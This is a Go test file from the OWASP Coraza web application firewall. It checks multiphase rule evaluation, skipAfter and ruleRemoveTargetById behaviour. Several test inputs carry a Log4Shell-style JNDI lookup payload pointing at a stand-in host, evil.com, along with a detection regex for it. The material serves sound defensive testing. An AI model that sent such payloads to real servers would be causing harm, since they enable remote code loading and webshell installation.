// Copyright 2022 Juan Pablo Tosso and the OWASP Coraza contributors
// SPDX-License-Identifier: Apache-2.0

//go:build coraza.rule.multiphase_evaluation

package engine

import "github.com/corazawaf/coraza/v3/testing/profile"

var _ = profile.RegisterProfile(profile.Profile{
	Meta: profile.Meta{
		Author:      "M4tteoP",
		Description: "Tests fixed bypasses",
		Enabled:     true,
		Name:        "multiphase.yaml",
	},
	Tests: []profile.Test{
		{
			Title: "bypassesPhase1",
			Stages: []profile.Stage{
				{
					Stage: profile.SubStage{
						Input: profile.StageInput{
							URI:    "/",
							Method: "POST",
							Headers: map[string]string{
								"Content-Type": "application/x-www-form-urlencoded",
								"User-Agent":   "CRS 3 Tests ${jndi:ldap://evil.com/webshell}"},
						},
						Output: profile.ExpectedOutput{
							TriggeredRules: []int{944150},
							// Rule 1 should not be triggered because of rule 944150 (precisely REQUEST_HEADERS variable)
							// is anticipated to phase:1 thanks to multiphase evaluation
							NonTriggeredRules: []int{1},
							Interruption: &profile.ExpectedInterruption{
								Status: 503,
								Data:   "",
								RuleID: 944150,
								Action: "deny",
							},
						},
					},
				},
				{
					Stage: profile.SubStage{
						Input: profile.StageInput{
							URI:     "/",
							Method:  "POST",
							Headers: map[string]string{"Content-Type": "application/x-www-form-urlencoded"},
							Data:    "foo=${jndi:ldap://evil.com/webshell}",
						},
						Output: profile.ExpectedOutput{
							// Rule 1 is triggered. The malicious payload is in the request body,
							// therefore we have to reach phase 2 to evaluate it. In that case no action is taken
							// at phase 1.
							TriggeredRules:    []int{1},
							NonTriggeredRules: []int{1944150},
							Interruption: &profile.ExpectedInterruption{
								Status: 403,
								Data:   "",
								RuleID: 1,
								Action: "deny",
							},
						},
					},
				},
			},
		},
	},
	Rules: `
SecDebugLogLevel 9
SecRequestBodyAccess On

SecAction "id:1, phase:2, log, deny, status:403"
SecRule REQUEST_LINE|ARGS|ARGS_NAMES|REQUEST_COOKIES|REQUEST_COOKIES_NAMES|REQUEST_HEADERS|XML:/*|XML://@* "@rx (?i)(?:\$|&dollar;?)(?:\{|&l(?:brace|cub);?)(?:[^\}]{0,15}(?:\$|&dollar;?)(?:\{|&l(?:brace|cub);?)|jndi|ctx)" \
    "id:944150, phase:2, deny, status:503"

`,
})

var _ = profile.RegisterProfile(profile.Profile{
	Meta: profile.Meta{
		Author:      "M4tteoP",
		Description: "Tests CRS skipAfter usage with multiphase",
		Enabled:     true,
		Name:        "multiphase_skipafter.yaml",
	},
	Tests: []profile.Test{
		{
			Title: "skipAfterForPL",
			Stages: []profile.Stage{
				{
					Stage: profile.SubStage{
						Input: profile.StageInput{
							URI:    "/",
							Method: "POST",
							Headers: map[string]string{
								"Content-Type": "application/x-www-form-urlencoded",
								"User-Agent":   "CRS 3 Tests ${jndi:ldap://evil.com/webshell}"},
						},
						Output: profile.ExpectedOutput{
							TriggeredRules: []int{900001, 911011, 911012},
							// Placing skipAfter rules the earliest possible and for each phase permits to properly skip the rules.
							// 944150 should have been triggered at phase 1 but it is skipped thanks to skipAfter.
							NonTriggeredRules: []int{944150, 100},
						},
					},
				},
				{
					Stage: profile.SubStage{
						Input: profile.StageInput{
							URI:    "/",
							Method: "POST",
							Headers: map[string]string{
								"Content-Type": "application/x-www-form-urlencoded"},
							Data: "${jndi:ldap://evil.com/webshell}",
						},
						Output: profile.ExpectedOutput{
							TriggeredRules: []int{900001, 911011, 911012},
							// Placing skipAfter rules the earliest possible and for each phase permits to properly skip the rules.
							// 944150 should have been triggered at phase 1 but it is skipped thanks to skipAfter.
							NonTriggeredRules: []int{944150, 100},
						},
					},
				},
			},
		},
	},
	Rules: `
SecDebugLogLevel 9
SecRequestBodyAccess On

SecAction "id:900001, phase:1, nolog, pass, t:none, setvar:tx.detection_paranoia_level=1"

SecRule TX:DETECTION_PARANOIA_LEVEL "@lt 2" "id:911011,phase:1,pass,nolog,skipAfter:END-REQUEST"
SecRule TX:DETECTION_PARANOIA_LEVEL "@lt 2" "id:911012,phase:2,pass,nolog,skipAfter:END-REQUEST"

SecRule REQUEST_LINE|ARGS|ARGS_NAMES|REQUEST_COOKIES|REQUEST_COOKIES_NAMES|REQUEST_HEADERS|XML:/*|XML://@* "@rx (?i)(?:\$|&dollar;?)(?:\{|&l(?:brace|cub);?)(?:[^\}]{0,15}(?:\$|&dollar;?)(?:\{|&l(?:brace|cub);?)|jndi|ctx)" \
    "id:944150, phase:2, deny, status:503"

SecRule REQUEST_URI "/" "id:100, phase:2, t:none, pass, log, chain"
	SecRule REQUEST_URI "@unconditionalMatch" "t:none"

SecMarker "END-REQUEST"
`,
})

var _ = profile.RegisterProfile(profile.Profile{
	Meta: profile.Meta{
		Author:      "M4tteoP",
		Description: "Tests CRS ruleRemoveTargetById usage with multiphase",
		Enabled:     true,
		Name:        "multiphase_ruleRemoveTargetById.yaml",
	},
	Tests: []profile.Test{
		{
			Title: "ruleRemoveTargetById",
			Stages: []profile.Stage{
				{
					Stage: profile.SubStage{
						Input: profile.StageInput{
							URI:     "/test",
							Method:  "POST",
							Headers: map[string]string{"Content-Type": "application/x-www-form-urlencoded"},
							Data:    "test"},
						Output: profile.ExpectedOutput{
							TriggeredRules:    []int{1, 3, 4},
							NonTriggeredRules: []int{2},
						},
					},
				},
			},
		},
	},
	// It is expected that rule 1 removes REQUEST_URI from rules 2 and 3, therefore at phase:1 no deny actions are triggered.
	// (wether rule 2 or rule 3 inferred at phase 1 because of REQUEST_URI). Rule 4 checks that.
	// Afterwards, at phase 2, rule 3 is triggered thanks to REQUEST_BODY.
	Rules: `
SecDebugLogLevel 9
SecRequestBodyAccess On

SecRule REQUEST_URI "@rx /" "id:1, phase:1, pass, t:none, ctl:ruleRemoveTargetById=2-3;REQUEST_URI"
SecRule REQUEST_URI "@rx test" "id:2, phase:1, deny, status:503"
SecRule REQUEST_URI|REQUEST_BODY "@rx test" "id:3, phase:2, deny, status:504"
SecRule REQUEST_URI "@unconditionalMatch" "id:4, phase:1, pass"
`,
})
